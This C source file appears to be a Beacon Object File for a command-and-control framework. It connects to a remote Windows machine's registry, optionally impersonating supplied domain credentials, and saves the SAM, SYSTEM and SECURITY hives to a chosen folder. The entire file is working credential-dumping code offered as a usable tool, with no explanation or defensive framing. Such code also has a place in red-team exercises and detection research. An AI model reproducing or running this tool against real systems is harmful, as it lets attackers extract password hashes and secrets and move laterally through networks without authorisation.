#include <stdio.h>
#include <Windows.h>
#include "beacon.h"

DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$LogonUserW(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE hToken); 
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$RegConnectRegistryW(LPCWSTR lpMachineName, HKEY hKey, PHKEY  phkResult);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$RegOpenKeyExW(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$RegSaveKeyW(HKEY hKey, LPCWSTR lpFile, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError (void);
WINBASEAPI wchar_t WINAPI MSVCRT$wcscat(wchar_t * destination, const wchar_t * source);

VOID MakeToken(LPCWSTR domain, LPCWSTR user, LPCWSTR password) {
	
	HANDLE token;

	if (ADVAPI32$LogonUserW(user, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &token) == 0) {
		BeaconPrintf(CALLBACK_ERROR, "LogonUserW: %d\n", KERNEL32$GetLastError());
		return;
	}
	
	if (ADVAPI32$ImpersonateLoggedOnUser(token) == 0) {
		BeaconPrintf(CALLBACK_ERROR, "ImpersonateLoggedOnUser: %d\n", KERNEL32$GetLastError());
		return;
	}

    BeaconPrintf(CALLBACK_OUTPUT, "Impersonated user: %ls\\%ls", domain, user);
	return;
}

void go(char * args, int alen) {

    datap parser;
    BeaconDataParse(&parser, args, alen);

    const wchar_t * target       = (wchar_t *) BeaconDataExtract(&parser, NULL);
    const wchar_t * saveFolder   = (wchar_t *) BeaconDataExtract(&parser, NULL);

    const wchar_t * domain       = (wchar_t *) BeaconDataExtract(&parser, NULL);
    const wchar_t * user         = (wchar_t *) BeaconDataExtract(&parser, NULL);
    const wchar_t * password     = (wchar_t *) BeaconDataExtract(&parser, NULL);
    
    target      = (*target == 0)        ? NULL : target;
    saveFolder  = (*saveFolder == 0)    ? NULL : saveFolder;
    domain      = (*domain == 0)        ? NULL : domain;
    user        = (*user == 0)          ? NULL : user;
    password    = (*password == 0)      ? NULL : password;

    if (target == NULL || saveFolder == NULL ){
        BeaconPrintf(CALLBACK_ERROR, "Not enough arguments.");
        return;
    }
    
    if ((domain != NULL) && (user != NULL) && (password != NULL)){
        BeaconPrintf(CALLBACK_OUTPUT, "Got Credentials. Making Token...");
        MakeToken(domain, user, password);
    }

    if (target && saveFolder){
        BeaconPrintf(CALLBACK_OUTPUT, "Will try to dump SAM from %ls\\HKLM\\ into folder '%ls'", target, saveFolder);
    }

	HKEY hklm;
	HKEY hkey;
	DWORD result;
	const wchar_t* hives[] = { L"SAM",L"SYSTEM",L"SECURITY" };

    BeaconPrintf(CALLBACK_OUTPUT, "Connecting to remote registry of '%ls'", target);
	result = ADVAPI32$RegConnectRegistryW(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
	 	BeaconPrintf(CALLBACK_ERROR, "RegConnectRegistryW: %d\n", result);
	 	return;
	}
    BeaconPrintf(CALLBACK_OUTPUT, "RegConnectRegistryW() - OK");
	
	for (int i = 0; i < 3; i++) {

        wchar_t tempSave[128] = {0};
        MSVCRT$wcscat(tempSave,saveFolder);
        MSVCRT$wcscat(tempSave,hives[i]);

		BeaconPrintf(CALLBACK_OUTPUT, "Dumping %ls\\HKLM\\%ls hive to %ls", target, hives[i], tempSave);
		result = ADVAPI32$RegOpenKeyExW(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
		if (result != 0) {
			BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExW: %d\n", result);
			return;
		}

        result = ADVAPI32$RegSaveKeyW(hkey, tempSave, NULL);
		if (result != 0) {
			BeaconPrintf(CALLBACK_ERROR, "RegSaveKeyW: %d\n", result);
			return;
		}
	}
}
